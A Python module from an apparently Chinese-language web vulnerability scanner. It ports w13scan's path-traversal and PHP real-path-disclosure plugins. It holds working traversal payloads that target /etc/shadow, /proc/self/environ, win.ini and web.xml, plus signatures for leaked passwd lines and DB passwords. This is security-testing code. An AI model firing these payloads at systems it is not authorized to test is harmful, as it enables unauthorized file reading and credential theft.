"""任意文件读取插件族 (移植 w13scan ``directory_traversal.py`` / ``php_real_path.py``).

w13scan 的路径穿越插件同时支持 GET/POST/Cookie 三个位置与 ``../``/绝对路径/编码变体;
这里保留 GET/POST (Cookie 位置需要爬虫先采集 Cookie, 见 :meth:`Plugin.matches` 说明)。
判定使用 w13scan 的 ``plainArray`` + ``regexArray`` 双特征库 —— 只匹配"文件内容",
不匹配"响应长度变化", 因此误报率极低。
"""
from __future__ import annotations

import re

from ...core.models import Finding, Severity
from ..vulndb import FILE_READ_PAYLOADS
from .base import A01, Plugin, PluginContext, register, snippet, with_param

#: 命中即证明读到了文件的明文特征 (w13scan ``directory_traversal.plainArray``)
PLAIN_SIGNS: tuple[str, ...] = (
    "root:x:0:0:",
    "[boot loader]",
    "[fonts]",
    "; for 16-bit app support",
    "[MCI Extensions.BAK]",
    "# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.",
    "# localhost name resolution is handled within DNS itself.",
)

#: 命中特征的正则 (w13scan ``directory_traversal.regexArray``)
REGEX_SIGNS: tuple[str, ...] = (
    r"(Linux+\sversion\s+[\d.\w\-_+]+\s+\([^)]+\)\s+\(gcc\sversion\s[\d.\-_]+\s)",
    r"(root:\w:\d*:)",
    r"daemon:x:\d+:\d+:",
    r"System\.IO\.FileNotFoundException: Could not find file\s'\w:",
    r"System\.IO\.DirectoryNotFoundException: Could not find a part of the path\s'\w:",
    r"<b>Warning</b>:\s+DOMDocument::load\(\)[^<]*?(Windows/win.ini|/etc/passwd)",
    r"(<web-app[\s\S]+</web-app>)",
    r"open_basedir restriction in effect",
    r"/bin/(bash|sh)[^\r\n<>]*[\r\n]",
    r"DB_PASSWORD\s*=",
    r"FLAG\{[^}]{4,}\}",
)

#: 附加载荷 (w13scan ``generate_payloads`` 的 Windows / Java 分支)
EXTRA_PAYLOADS: tuple[str, ...] = (
    "../../../../../../../../../../windows/win.ini",
    "../../../../../../../../../../windows/System32/drivers/etc/hosts",
    "C:\\boot.ini",
    "C:\\WINDOWS\\win.ini",
    "/WEB-INF/web.xml",
    "../../WEB-INF/web.xml",
    "/proc/self/environ",
    "../../../../../../../../../../etc/shadow",
)


def match_file_read(body: str) -> str:
    """返回命中的文件内容特征; 未命中返回空串."""
    for sign in PLAIN_SIGNS:
        if sign in body:
            return sign
    for pattern in REGEX_SIGNS:
        match = re.search(pattern, body, re.I | re.S | re.M)
        if match:
            return match.group(0)[:120]
    return ""


@register
class Lfi(Plugin):
    """路径穿越 / 任意文件读取 (w13scan ``directory_traversal``)."""

    name = "lfi"
    title = "任意文件读取 (路径穿越)"
    category = "lfi"
    severity = Severity.HIGH
    cwe = "CWE-22"
    owasp = A01
    description = "注入 ../ 与绝对路径载荷读取 /etc/passwd、win.ini 等文件, 依据文件内容判定"
    param_hints = ("file", "path", "filename", "filepath", "download", "template",
                   "include", "doc", "read", "load", "src", "source", "page", "url",
                   "uri", "dir", "folder", "name", "img", "image", "attachment")
    references = ("https://owasp.org/www-community/attacks/Path_Traversal",)

    def run(self, ctx: PluginContext) -> list[Finding]:
        payloads = list(FILE_READ_PAYLOADS) + list(EXTRA_PAYLOADS)
        for payload in payloads:
            # safe="/\\": 路径穿越载荷必须保留分隔符原貌 (与 w13scan 的 urlsafe 一致),
            # 否则 ../ 会被编码成 ..%2F, 大量中间件不会解码, 检测直接失效。
            result = ctx.inject(payload, safe="/\\")
            if not result.status or not result.body:
                continue
            sign = match_file_read(result.text)
            if not sign:
                continue
            return [ctx.add(
                vuln_type="path_traversal", url=result.url, method=result.method,
                param=ctx.param, payload=payload,
                evidence=snippet(result.text, sign, 60),
                severity=self.severity, confidence=0.95,
                proof=f"载荷 {payload!r} 读到了系统文件内容 (特征 {sign!r})")]
        return []


#: PHP 报错中真实路径的提取正则 (w13scan ``php_real_path``: 参数变数组触发 Warning)
PHP_ARRAY_WARNING = re.compile(r"array given in\s+([^\s]+)\s+on line", re.I)


@register
class PhpRealPath(Plugin):
    """PHP 真实路径泄漏 (w13scan ``php_real_path``).

    把 ``k=v`` 改成 ``k[]=v`` 会让 PHP 在期望标量处收到数组, ``Warning`` 里通常带着
    服务器上的绝对路径 —— 这是一条低危但很实用的信息泄漏。
    """

    name = "php_real_path"
    title = "PHP 真实路径泄漏"
    category = "info"
    severity = Severity.LOW
    cwe = "CWE-209"
    owasp = A01
    description = "把参数改写为数组形式触发 PHP Warning, 从报错中提取服务器绝对路径"
    param_hints = ("id", "q", "name", "page", "file", "path", "url", "user", "type",
                   "action", "cat", "key", "search", "query")

    def run(self, ctx: PluginContext) -> list[Finding]:
        array_param = f"{ctx.param}[]"
        if ctx.position == "form":
            url = ctx.endpoint.url
            body = f"{array_param}=sentinel9137"
            probe = ctx.request(ctx.endpoint.method or "POST", url, body,
                                {"Content-Type": "application/x-www-form-urlencoded"})
        else:
            probe = ctx.raw(with_param(ctx.endpoint.url, array_param, "sentinel9137"))
        if not probe.status or "Warning" not in probe.text:
            return []
        match = PHP_ARRAY_WARNING.search(probe.text)
        if not match:
            return []
        path = match.group(1)
        return [ctx.add(
            vuln_type="sensitive", url=probe.url, method=probe.method,
            param=array_param, payload=f"{array_param}=sentinel9137",
            evidence=snippet(probe.text, path, 60),
            severity=self.severity, confidence=0.8,
            proof=f"参数改写为数组触发 PHP Warning, 泄漏服务器路径 {path!r}")]


__all__ = ["EXTRA_PAYLOADS", "PHP_ARRAY_WARNING", "PLAIN_SIGNS", "REGEX_SIGNS",
           "Lfi", "PhpRealPath", "match_file_read"]
